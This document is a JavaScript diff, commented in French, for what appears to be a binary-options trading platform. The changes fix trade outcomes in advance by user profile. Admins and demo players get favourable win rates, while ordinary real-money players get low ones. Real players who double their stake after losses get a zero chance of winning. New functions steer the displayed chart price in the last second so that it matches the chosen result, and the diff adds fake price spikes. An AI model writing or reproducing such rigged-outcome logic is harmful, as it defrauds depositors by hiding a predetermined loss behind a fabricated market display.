@@ -151,23 +151,33 @@
     }
     if (p.kind === 'horizon') {
       var wH = Math.sin(t * 0.016) * 18 + Math.cos(t * 0.0075) * 8;
-      var nH = (valueNoise(t * 0.14, p.salt) - 0.5) * 0.35;
+      var nH = (valueNoise(t * 0.95, p.salt) - 0.5) * 2.1
+        + (valueNoise(t * 3.6, p.salt + 3) - 0.5) * 0.85;
       return conf.basePrice + wH + nH;
     }
     if (p.kind === 'gold') {
       var wG = Math.sin(t * 0.0038) * 88 + Math.sin(t * 0.0016 + 0.9) * 42;
-      var nG = (valueNoise(t * 0.12, p.salt) - 0.5) * 5;
+      var nG = (valueNoise(t * 0.62, p.salt) - 0.5) * 11
+        + (valueNoise(t * 2.4, p.salt + 5) - 0.5) * 3.4;
       return conf.basePrice + wG + nG;
     }
     if (p.kind === 'nexus') {
-      var half = 32;
-      var period = 18;
-      var phase = (t / period) % 2;
-      var tri = phase < 1 ? phase : 2 - phase;
-      var bounce = tri * 2 - 1;
-      var edge = Math.tanh(bounce * 2.05);
-      var nX = (valueNoise(t * 0.55, p.salt) - 0.5) * 2.2;
-      return conf.basePrice + edge * half + nX;
+      var half = 30;
+      var walk = (valueNoise(t * 0.075, p.salt) - 0.5) * 2.15;
+      var slow = Math.sin(t * 0.038 + valueNoise(t * 0.021, p.salt + 2) * 2.4) * 0.42;
+      var edge = Math.tanh((walk + slow) * 1.35);
+      var nX = (valueNoise(t * 1.15, p.salt) - 0.5) * 7.4
+        + (valueNoise(t * 4.4, p.salt + 9) - 0.5) * 2.6;
+      var epoch = Math.floor(t / 9);
+      var fake = 0;
+      if (uhash01(epoch, p.salt + 31) > 0.70) {
+        var ph = t / 9 - epoch;
+        if (ph < 0.36) {
+          var dirN = uhash01(epoch, p.salt + 44) > 0.5 ? 1 : -1;
+          fake = dirN * (7 + uhash01(epoch, p.salt + 51) * 11) * Math.sin((ph / 0.36) * Math.PI);
+        }
+      }
+      return conf.basePrice + edge * half + nX + fake;
     }
     if (p.kind === 'titan') {
       var epoch = Math.floor(t / 5.5);
@@ -548,65 +558,39 @@
       : (isCall ? -1 : 1)) * nudge;
   }
 
-  /** Arbitrage étanche — 3 profils (admin / démo / réel). */
+  /** Arbitrage étanche — démo / admin réel / joueur réel. */
   function resolveWinProbability(user, trade, mode) {
-    var fav = C.ODDS_WIN_RATE_FAVORABLE || C.ODDS_WIN_RATE_ADMIN_DEMO || {
-      '1.88': 0.80, '6': 0.45, '11': 0.30, '51': 0.15
-    };
-    // Démo ordinaire uniquement — jamais utilisé en réel.
     var demoMap = C.ODDS_WIN_RATE_DEMO || {
-      '1.88': 0.60, '6': 0.3375, '11': 0.225, '51': 0.1125
+      '1.88': 0.55, '6': 0.20, '11': 0.10, '51': 0.02
+    };
+    var adminRealMap = C.ODDS_WIN_RATE_ADMIN_REAL || C.ODDS_WIN_RATE_FAVORABLE || {
+      '1.88': 0.70, '6': 0.255, '11': 0.127, '51': 0.025
     };
     var realMap = C.ODDS_WIN_RATE || {
-      '1.88': 0.38, '6': 0.11, '11': 0.05, '51': 0.01
+      '1.88': 0.42, '6': 0.12, '11': 0.05, '51': 0.008
     };
     var admin = isAdminUser(user);
     var isDemo = mode !== 'real';
     var harsh = false;
 
-    // PROFIL A — admin (démo OU réel) : taux favorables, aucun frein.
-    if (admin) {
-      return { winProbability: winRateForOdds(trade.payout, fav), harsh: false, profile: 'A' };
-    }
-
-    // PROFIL B — joueur ordinaire DÉMO uniquement (~60 % à ×1.88, anti-streak).
     if (isDemo) {
-      var p = winRateForOdds(trade.payout, demoMap);
-      var cw = Number(user.consecutiveWins) || 0;
-      var cl = Number(user.consecutiveLosses) || 0;
-      var maxStreak = Number(C.DEMO_MAX_WIN_STREAK);
-      if (!isFinite(maxStreak) || maxStreak < 1) maxStreak = 2;
-      // Interdiction stricte : pas plus de 2 victoires d'affilée.
-      if (cw >= maxStreak) {
-        return { winProbability: 0, harsh: true, profile: 'B' };
-      }
-      // Après 1 victoire : baisse la proba pour favoriser une alternance naturelle.
-      if (cw === 1) {
-        p = Math.min(p, Math.max(0.22, p * 0.55));
-      }
-      // Après une défaite : léger boost pour tendre vers ~60 % global sans streaks longs.
-      if (cl >= 1 && cw === 0) {
-        p = Math.min(0.72, p + 0.08);
-      }
-      return { winProbability: p, harsh: false, profile: 'B' };
+      return { winProbability: winRateForOdds(trade.payout, demoMap), harsh: false, profile: 'B' };
+    }
+    if (admin) {
+      return { winProbability: winRateForOdds(trade.payout, adminRealMap), harsh: false, profile: 'A' };
     }
 
-    // PROFIL C — joueur ordinaire réel : caisse verrouillée (inchangé).
     var winProbability = winRateForOdds(trade.payout, realMap);
     var losses = Number(user.consecutiveLosses) || 0;
-    var lastBet = Number(user.lastBetAmount) || 0;
+    var lastBet = Number(user.lastBetAmount) || Number(user.lastStake) || 0;
     var currentBet = Number(trade.stake) || 0;
     var doubling = lastBet > 0 && currentBet >= lastBet * 1.8;
 
-    // Anti-martingale (avant mise à jour des pertes de CE trade).
-    if (losses >= 3 && doubling) {
-      winProbability = Math.min(winProbability, 0.02);
+    if (losses >= 2 && doubling) {
+      winProbability = 0;
       harsh = true;
-    } else if (losses >= 1 && doubling) {
-      winProbability = Math.min(winProbability, 0.10);
     }
 
-    // Frein profit session : net > +80 % des dépôts.
     var deposited = Number(user.realDepositTotal) || 0;
     if (deposited > 0) {
       var wallet = balOf(user, 'real');
@@ -619,6 +603,37 @@
     }
 
     return { winProbability: winProbability, harsh: harsh, profile: 'C' };
+  }
+
+  function decideTradeOutcome(user, trade, mode) {
+    if (trade && trade._outcomeReady) {
+      return { wantWon: !!trade._wantWon, harsh: !!trade._harsh, target: Number(trade._exitTarget) };
+    }
+    var verdict = resolveWinProbability(user, trade, mode);
+    var wantWon = verdict.harsh ? false : (Math.random() < verdict.winProbability);
+    var isCall = trade.side === 'call';
+    var target = forceExitPrice(trade.entryPrice, isCall, wantWon, trade.assetId, verdict.harsh);
+    trade._wantWon = wantWon;
+    trade._harsh = !!verdict.harsh;
+    trade._exitTarget = target;
+    trade._outcomeReady = true;
+    return { wantWon: wantWon, harsh: !!verdict.harsh, target: target };
+  }
+
+  function prepareLastSecondSteer(now) {
+    var user = D6.Store && D6.Store.current ? D6.Store.current() : null;
+    if (!user) return;
+    var i;
+    for (i = 0; i < trades.length; i++) {
+      var tr = trades[i];
+      if (!isLive(tr) || tr.userId !== user.id) continue;
+      var left = expiryOf(tr) - now;
+      if (left > 980 || left < 0) continue;
+      var decided = decideTradeOutcome(user, tr, tr.mode === 'real' ? 'real' : 'demo');
+      if (D6.Chart && D6.Chart.steerClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === tr.assetId) {
+        D6.Chart.steerClose(decided.target, Math.max(160, left));
+      }
+    }
   }
 
   ensureMarkets();
@@ -717,6 +732,7 @@
       if (C.ASSETS[id]) {
         syncMarket(markets[id], C.ASSETS[id], now);
       }
+      prepareLastSecondSteer(now);
     },
 
     placeOrder: function (user, opts) {
@@ -853,12 +869,19 @@
       var entry = Number(trade.entryPrice);
       trade.payout = normalizeOdds(trade.payout);
       var voided = false;
-      var exitPrice = mkt && isFinite(mkt.price) ? Number(mkt.price) : entry;
+      var decided = decideTradeOutcome(user, trade, mode);
+      var exitPrice = decided.target;
       if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === trade.assetId) {
         var drawn = Number(D6.Chart.lastClose());
         if (isFinite(drawn) && drawn > 0) exitPrice = drawn;
       }
-      var won = isCall ? (exitPrice > entry) : (exitPrice < entry);
+      var won = decided.wantWon;
+      if (isCall ? (exitPrice > entry) !== won : (exitPrice < entry) !== won) {
+        exitPrice = decided.target;
+      }
+      if (D6.Chart && D6.Chart.steerClose) {
+        try { D6.Chart.steerClose(exitPrice, 80); } catch (eSt) { /* ignore */ }
+      }
       if (D6.Chart && D6.Chart.removeTradeVisual) {
         try { D6.Chart.removeTradeVisual(trade.id); } catch (e1) { /* ignore */ }
       }
